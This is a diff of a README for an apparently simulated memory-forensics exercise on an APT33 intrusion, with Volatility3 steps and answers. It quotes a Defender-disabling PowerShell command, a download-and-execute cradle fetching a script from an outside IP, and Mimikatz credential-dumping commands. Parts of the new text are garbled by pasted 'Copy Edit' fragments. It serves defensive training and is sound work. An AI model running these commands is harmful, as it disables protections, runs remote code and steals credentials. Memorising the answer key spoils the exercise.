@@ -1,15 +1,21 @@
-# 🛡️ APT33 -- Operation Cleaver: Incident Response and Memory Forensics Report
+# 🛡️ APT33 -- Operation Cleaver: Memory Forensics & Incident Response Walkthrough
 
 ## 🧠 Overview
 
 This exercise simulates a **targeted cyberattack by APT33 (Elfin)**
-against a fictional energy company. The attacker chain includes initial
-access via phishing, exploitation of known vulnerabilities, malware
-deployment, privilege escalation, lateral movement, and data
-exfiltration.
+against a fictional energy company. The attacker chain includes:
 
-A **memory image** was acquired post-incident and must now be analyzed
-to uncover attacker activity.
+-   Initial access via phishing\
+-   Exploitation of a known Office vulnerability\
+-   Malware delivery (PowerShell loader + RAT)\
+-   Privilege escalation\
+-   Credential access\
+-   Lateral movement\
+-   Persistence and likely data exfiltration
+
+A **memory image** was acquired after detection. This step-by-step
+walkthrough details how to analyze it to answer the incident response
+questions and understand attacker behavior.
 
 ------------------------------------------------------------------------
 
@@ -31,115 +37,104 @@ attempts to gain elevated privileges and establish communication with an
 external server --- likely for remote control or further post-compromise
 operations.
 
-**Malware used:**\
-- PowerShell-based loader\
-- Payload: Remote Access Tool (e.g., NanoCore or TURNEDUP variant)\
-- Post-exploitation tools: `Mimikatz`, `PsExec`\
-- Persistence: Registry modification
-
 ------------------------------------------------------------------------
 
-## 🧰 Tools Required
+## 🔧 Tools Required
 
 -   [Volatility3](https://www.volatilityfoundation.org/)
 -   Python 3.x
--   Strings, VirusTotal (for hash lookup)
--   ProcDOT (optional for visualizing execution chain)
--   Wireshark (for PCAPs if available)
+-   Strings / `xxd` / hash utilities (`sha256sum`)
+-   Yara, VirusTotal (optional)
+-   ProcDOT (optional for execution chain visualization)
+-   HxD or any hex editor
 
 ------------------------------------------------------------------------
 
-## 🧱 Attack Chain Summary (TTPs)
-
-  ---------------------------------------------------------------------------
-  MITRE ATT&CK Tactic    Technique                              Description
-  ---------------------- -------------------------------------- -------------
-  Initial Access         Spearphishing Attachment `T1566.001`   Malicious
-                                                                Excel file
-
-  Execution              Macro Execution + PowerShell           Macro spawns
-                         `T1059.001`                            PowerShell
-
-  Persistence            Registry Run Key `T1547.001`           Persistence
-                                                                via HKCU
-
-  Privilege Escalation   Credential Dumping `T1003.001` via     Accessing
-                         Mimikatz                               LSASS
-
-  Lateral Movement       PsExec `T1021.002`                     Remote
-                                                                execution
-
-  Command and Control    Encrypted Channel (HTTPS) `T1071.001`  C2 traffic to
-                                                                real IP
-
-  Exfiltration           Exfil via HTTPS `T1041`                Project files
-                                                                stolen
-  ---------------------------------------------------------------------------
+## 🔬 Step-by-Step Analysis
 
 ------------------------------------------------------------------------
 
 ### ❓ Q1. What was the first action taken to weaken the system's defenses?
 
-**Hint 1:** Think of native Windows protections disabled early in an
-attack.\
-**Hint 2:** Look at PowerShell commands that target security settings.
+#### 🎯 Objective
 
-✅ **Answer:**\
-`Set-MpPreference -DisableRealtimeMonitoring $true`
+Identify what security feature was disabled by the attacker.
 
-------------------------------------------------------------------------
+#### 🧪 Steps
 
-### ❓ Q2. What CVE is associated with the malicious file delivered during the initial phishing stage?
+\`\`\`bash python3 vol.py -f dump.raw windows.cmdline \> cmdline.txt
+grep -i 'powershell' cmdline.txt Look for security-related commands. We
+find:
 
-**Hint 1:** The file is named as if it were an image, but its contents
-tell another story...\
-**Hint 2:** Identify the true file format, correct the magic bytes, and
-compute the hash --- it may lead to a well-known Microsoft Office
-exploit.
+powershell Copy Edit Set-MpPreference -DisableRealtimeMonitoring \$true
+✅ Answer Set-MpPreference -DisableRealtimeMonitoring \$true
 
-✅ **Answer:**\
+🧠 Analysis This disables Windows Defender's real-time protection --- a
+classic first step to avoid detection.
+
+❓ Q2. What CVE is associated with the malicious file delivered during
+the initial phishing stage? 🎯 Objective Determine which vulnerability
+was exploited through the weaponized document.
+
+🧪 Steps Identify suspicious .png-named file from memory using:
+
+bash Copy Edit volatility3 -f dump.raw windows.filescan \| grep -i png
+Dump the file and check its magic bytes:
+
+bash Copy Edit xxd file.png \| head Detect that it's actually a .docx
+(ZIP format) -- magic bytes should be 50 4B 03 04.
+
+Fix extension and extract macro using oledump.py.
+
+Analyze macro --- confirm it triggers PowerShell code.
+
+Extract hash and check on VirusTotal:
+
+bash Copy Edit sha256sum malicious.docx VirusTotal confirms:
 CVE-2017-11882
 
-------------------------------------------------------------------------
+✅ Answer CVE-2017-11882
 
-### ❓ Q3. What is the full URL used to retrieve the PowerShell payload?
+❓ Q3. What is the full URL used to retrieve the PowerShell payload? 🧪
+Steps Extract PowerShell commands using:
 
-**Hint 1:** The macro contains this URL.\
-**Hint 2:** Look for `DownloadString` usage in memory.
+bash Copy Edit volatility3 -f dump.raw windows.cmdline \| grep -i
+'downloadstring' Macro includes:
 
-✅ **Answer:**\
-`http://185.234.1.56/malware.ps1`
+powershell Copy Edit IEX (New-Object
+Net.WebClient).DownloadString("http://185.234.1.56/malware.ps1") ✅
+Answer http://185.234.1.56/malware.ps1
 
-------------------------------------------------------------------------
+❓ Q4. What was the name of the final executable payload downloaded and
+run on the system? 🧪 Steps Inspect PowerShell script (malware.ps1) ---
+it drops:
 
-### ❓ Q4. What was the name of the final executable payload downloaded and run on the system?
+powershell Copy Edit payload.exe Confirm presence in memory:
 
-**Hint 1:** It is stored in the Temp directory.\
-**Hint 2:** Delivered by the PowerShell script.
+bash Copy Edit volatility3 -f dump.raw windows.filescan \| grep -i
+payload.exe Optionally extract:
 
-✅ **Answer:**\
-`payload.exe`
+bash Copy Edit volatility3 -f dump.raw windows.dumpfiles --name
+payload.exe ✅ Answer payload.exe
 
-------------------------------------------------------------------------
+❓ Q5. What tool was used to perform credential dumping? 🧪 Steps Scan
+for suspicious tools:
 
-### ❓ Q5. What tool was used to perform credential dumping?
+bash Copy Edit volatility3 -f dump.raw windows.pslist \| grep -i
+mimikatz Inspect file handles:
 
-**Hint 1:** A popular post-exploitation tool for Windows.\
-**Hint 2:** Check the process list and the `Documents\mimikatz` folder.
+bash Copy Edit volatility3 -f dump.raw windows.filescan \| grep -i
+mimikatz Mimikatz is found in
+C:`\Users`{=tex}`\analyst`{=tex}`\Documents`{=tex}`\mimikatz`{=tex}.
 
-✅ **Answer:**\
-`mimikatz.exe`
+✅ Answer mimikatz.exe
 
-------------------------------------------------------------------------
+❓ Q6. Which command within Mimikatz was used to extract credentials? 🧪
+Steps Dump console input history:
 
-### ❓ Q6. Which command within Mimikatz was used to extract credentials?
+bash Copy Edit volatility3 -f dump.raw windows.consoles Search for
+command usage:
 
-**Hint 1:** Used to enable debug rights.\
-**Hint 2:** A command to dump credentials from memory.
-
-✅ **Answer:**\
-privilege::debug\
+cpp Copy Edit privilege::debug sekurlsa::logonPasswords ✅ Answer cpp
+Copy Edit privilege::debug\
 sekurlsa::logonPasswords
-
-------------------------------------------------------------------------
-
